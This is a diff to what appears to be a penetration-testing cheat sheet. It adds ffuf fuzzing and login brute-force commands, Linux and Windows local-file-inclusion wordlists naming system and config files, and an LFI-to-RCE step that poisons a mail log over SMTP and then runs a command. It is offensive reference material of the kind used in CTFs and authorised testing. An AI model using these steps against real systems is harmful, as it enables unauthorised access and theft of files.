@@ -419,11 +419,15 @@ wfuzz -u http://localhost/login -w users.txt -w pass.txt -d "username=FUZZ&passw
 ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .php,.html,.txt,.bak -t 50
 ffuf -u 'https://FUZZ.bank.local' -w subdomains-top1million-20000.txt:FUZZ -t 30
 ffuf -u 'http://10.10.10.10/' -w sqli.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZZ" -fc 200
+ffuf -u 'https://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .txt -t 1 -fs 1508 -fl 4
 
 # POST Method
 ffuf -u 'http://10.10.10.10/main/wp-login.php' -w user.txt:USER -w pass.txt:PASS -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In"
 ffuf -u 'http://10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z" --fc 200
 ffuf -u 'http:/10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z"
+
+# With Cookie
+
 
 # With proxy
 ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -t 30 -e .php,.html,.txt -x http://10.10.10.10:3128
@@ -443,6 +447,7 @@ extension
 ### Local File Inclusion (LFI)
 
 ```bash
+=======Linux======
 # Wordlists
 /var/log/mail.log
 /etc/passwd
@@ -452,7 +457,8 @@ extension
 /etc/knockd.conf
 /etc/exports
 
-#(1)-----[/var/log/mail.log]-----
+=======LFI To RCE========
+#-----[/var/log/mail.log]-----
 nc 10.10.10.10 25
 
 HELO test
@@ -461,7 +467,50 @@ RCPT TO: root
 DATA
 .
 #RCE
-/var/log/mail&cmd=ls -la
+?page=/var/log/mail&cmd=ls -la
+
+======Windows======
+# Wordlists
+C:/windows/win.ini
+C:/windows/system.ini
+C:/windows/bootstat.dat
+C:/Program Files/Windows NT/Accessories/WordpadFilter.dll
+C:/Program Files/Common Files/mirosoft shared/Web Server Extensions/<Number 1-20>/BIN/FPWEC.DLL
+C:/Program Files/Exchsrvr/MDBDATA/Privi.edb
+C:/inetpub/wwwroot/iisstart.htm
+C:/windows/Microsoft.NET/Framework64/<version v4.0.30319>/vbc.exe.config
+C:/windows/Microsoft.NET/Framework64/<version v4.0.30319>/Config/web.config
+C:/windows/System32/drivers/etc/hosts
+C:/windows/System32/drivers/acpi.sys
+C:/windows/System32/drivers/etc/networks
+C:/Users/<user>/Desktop/Desktop.ini
+C:/windows/debug/NetSetup.log
+C:/windows/debug/mrt.log
+C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
+
+# ASP.Net 
+../../web.config
+../../Images/image.jpg
+../../packages.config
+../../Global.asax
+../../Views/web.config
+../../Content/bootstrap_dropdown.css
+../../Content/Site.css
+../../Views/_ViewStart.cshtml
+../../Views/_ViewStart.aspx
+../../Views/_ViewStart.ascx
+../../Views/Shared/Error.cshtml
+../../Views/Shared/Error.aspx
+../../Views/Shared/Error.ascx
+../../Viwws/Home/Index.cshtml
+../../Viwws/Home/Index.aspx
+../../Viwws/Home/Index.ascx
+../../bin/<namespace found>.dll
+
+
+# References
+- https://digi.ninja/blog/when_all_you_can_do_is_read.php
+- https://www.c-sharpcorner.com/UploadFile/3d39b4/folder-structure-of-Asp-Net-mvc-project/
 ```
 
 ### Remote Command Execution (RCE)
